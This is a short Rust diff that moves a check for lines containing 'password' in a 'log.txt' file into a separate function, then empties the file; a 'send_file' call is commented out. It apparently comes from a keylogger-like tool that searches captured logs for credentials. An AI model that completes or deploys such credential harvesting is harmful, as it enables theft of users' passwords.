@@ -49,16 +49,21 @@ fn size_check(file: &mut std::fs::File) {
     
     if file_size > 100 {
         let content = fs::read_to_string("log.txt").unwrap();
-        for line in content.lines() {
-            if line.contains("password") {
-                println!("{}", line);
-            }
-        }
+
+        creds_check(content);
 
         println!("File is too big");
         // send_file(file);
         // empty file
         file.set_len(0).expect("Failed to empty file");
+    }
+}
+
+fn creds_check(content: String) {
+    for line in content.lines() {
+        if line.contains("password") {
+            println!("FOUND!");
+        }
     }
 }
 
